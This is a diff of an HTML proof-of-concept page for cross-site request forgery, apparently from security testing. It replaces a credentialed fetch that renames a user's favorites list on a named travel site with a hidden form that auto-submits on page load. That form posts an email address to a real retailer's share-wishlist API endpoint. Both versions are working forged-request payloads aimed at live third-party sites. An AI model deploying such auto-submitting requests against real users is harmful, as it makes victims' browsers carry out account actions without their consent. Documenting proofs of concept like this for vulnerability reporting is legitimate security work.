@@ -1,16 +1,12 @@
-<!DOCTYPE html>
 <html>
-<body>
-<script>
-fetch("https://www.civitatis.com/api/user-account/favorites/list/modify/L2l5RjlpeEZ2bmxsdGQzdnA2d0k1QT09OjozaXFVQzJXd3NM", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "X-Requested-With": "XMLHttpRequest"
-  },
-  body: '{"listId":"959266","listName":"CSRF_TEST_CHANGED"}'
-});
-</script>
+<body onload="document.forms[0].submit()">
+
+<form action="https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR"
+      method="POST">
+
+    <input type="hidden" name="email" value="testerr0092@gmail.com">
+
+</form>
+
 </body>
 </html>
